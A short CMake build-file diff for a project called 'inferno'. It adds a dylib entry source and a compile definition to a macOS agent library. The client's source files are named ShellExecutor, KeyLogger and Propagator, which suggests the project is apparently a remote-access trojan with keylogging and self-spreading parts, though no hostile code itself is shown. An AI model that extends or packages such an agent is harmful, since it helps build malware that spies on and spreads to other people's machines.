@@ -86,6 +86,7 @@ add_executable(inferno_client
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
+    client/src/entry_dylib.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
@@ -117,6 +118,7 @@ if(APPLE)
         client/src/Propagator.cpp
     )
     target_include_directories(inferno_agent_dylib PRIVATE client/include)
+    target_compile_definitions(inferno_agent_dylib PRIVATE INFERNO_DYLIB)
     target_link_libraries(inferno_agent_dylib PRIVATE inferno_common)
     target_link_libraries(inferno_agent_dylib PRIVATE
         ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION}
